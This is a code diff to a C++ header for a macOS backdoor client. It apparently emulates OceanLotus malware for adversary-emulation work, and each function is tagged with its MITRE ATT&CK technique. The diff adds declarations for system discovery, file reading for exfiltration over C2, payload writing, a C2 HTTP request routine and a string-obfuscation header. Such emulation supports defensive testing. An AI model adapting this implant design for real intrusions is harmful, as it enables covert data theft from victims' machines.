@@ -4,6 +4,9 @@
 #include <chrono>
 #include <fstream>
 #include <iostream>
+#include <sstream>
+#include <sys/stat.h>
+#include <sys/utsname.h>
 #include <cstdio>
 #include <thread>
 #include <dlfcn.h>
@@ -11,9 +14,10 @@
 
 #include <CoreFoundation/CoreFoundation.h>
 #include <IOKit/IOKitLib.h>
+#include <SystemConfiguration/SystemConfiguration.h>
 
 #include "Communication.hpp"
-#include "Transform.hpp"
+#include "no_strings.hpp"
 
 namespace client {
     extern const int RESP_BUFFER_SIZE;
@@ -49,7 +53,30 @@ namespace client {
     std::string getPlatformExpertDeviceValue(std::string key);
 
     /*
-    downloadFile
+    getComputerName
+        About:
+            Helper function to get computer name using SCDynamicStoreCopyComputerName
+            API from SystemConfiguration framework
+        Result:
+            std::string - representing computer name
+        MITRE ATT&CK Techniques:
+            T1082 System Information Discovery
+    */
+    std::string getComputerName();
+
+    /*
+    getHardwareName
+        About:
+            Helper function to get the hardware name using uname API from utsname.h
+        Result:
+            std::string - representing hardware name
+        MITRE ATT&CK Techniques:
+            T1082 System Information Discovery
+    */
+    std::string getHardwareName();
+
+    /*
+    writeFile
         About:
             Helper function write payload bytes to the given path
         Result:
@@ -57,8 +84,27 @@ namespace client {
         MITRE ATT&CK Techniques:
             T1105 Ingress Tool Transfer
     */
-    bool downloadFile(std::vector<unsigned char> payload, std::string path);
+    bool writeFile(std::vector<unsigned char> payload, std::string path);
 
+    /*
+    readFile
+        About:
+            Helper function to read file bytes from the given path
+        Result:
+            vector<unsigned char> - file bytes
+        MITRE ATT&CK Techniques:
+            T1041 Exfiltration Over C2 Channel
+    */
+   std::vector<unsigned char> readFile(std::string path);
+
+   /*
+   getFileSize
+        About:
+            Helper function to get the file size from the given path
+        Result:
+            int - file size represented in bytes
+   */
+  int getFileSize(std::string path);
 }
 
 class ClientPP
@@ -164,7 +210,7 @@ public:
             https://www.welivesecurity.com/2019/04/09/oceanlotus-macos-malware-update/
         References:
     */
-    static std::vector<unsigned char> performHTTPRequest(void* dylib, std::string type, std::vector<unsigned char> data, unsigned char * instruction);
+    static void performHTTPRequest(void* dylib, std::string type, std::vector<unsigned char> data, unsigned char * instruction, std::string clientID, unsigned char* response_buffer_ptr, int* response_length_ptr);
 
     ~ClientPP();
 
